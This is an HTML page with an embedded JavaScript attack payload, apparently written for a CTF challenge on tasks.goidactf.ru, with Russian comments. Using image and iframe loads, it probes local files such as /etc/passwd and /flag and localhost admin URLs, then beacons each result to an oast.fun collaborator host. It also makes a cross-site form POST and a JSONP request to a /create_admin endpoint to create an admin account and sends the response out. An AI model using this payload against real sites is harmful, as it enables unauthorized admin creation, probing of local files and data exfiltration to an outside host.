<!DOCTYPE html>
<html>
<body>
<script>
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// Методы без CORS:

// 1. Image src для SSRF/чтения файлов
const testFiles = [
    'file:///etc/passwd',
    'file:///etc/hosts',
    'file:///flag',
    'http://localhost/',
    'http://127.0.0.1/',
    'http://localhost:80/admin',
    'http://127.0.0.1:80/admin'
];

testFiles.forEach(file => {
    const img = new Image();
    img.onload = () => {
        // Если загрузилось - ресурс существует
        new Image().src = `${COLLAB}/?loaded=${encodeURIComponent(file)}`;
    };
    img.onerror = (e) => {
        // Ошибка тоже информация
        new Image().src = `${COLLAB}/?error=${encodeURIComponent(file)}`;
    };
    img.src = file;
});

// 2. Form submission для создания админа (без CORS)
setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://tasks.goidactf.ru:20499/create_admin';
    form.target = '_blank';
    form.innerHTML = '<input name="new_admin_login" value="GITHUB_EXPLOIT">';
    document.body.appendChild(form);
    form.submit();
    
    new Image().src = `${COLLAB}/?form_submitted=yes`;
}, 2000);

// 3. Script tag для JSONP если поддерживается
setTimeout(() => {
    const script = document.createElement('script');
    script.src = `https://tasks.goidactf.ru:20499/create_admin?callback=myCallback&new_admin_login=JSONP_TEST`;
    document.body.appendChild(script);
    
    window.myCallback = function(data) {
        new Image().src = `${COLLAB}/?jsonp=${encodeURIComponent(JSON.stringify(data))}`;
    };
}, 4000);

// 4. Iframe для загрузки ресурсов
setTimeout(() => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'file:///etc/passwd';
    iframe.onload = () => {
        new Image().src = `${COLLAB}/?iframe_file_loaded=yes`;
    };
    iframe.onerror = () => {
        new Image().src = `${COLLAB}/?iframe_file_error=yes`;
    };
    document.body.appendChild(iframe);
}, 6000);
</script>
</body>
</html>
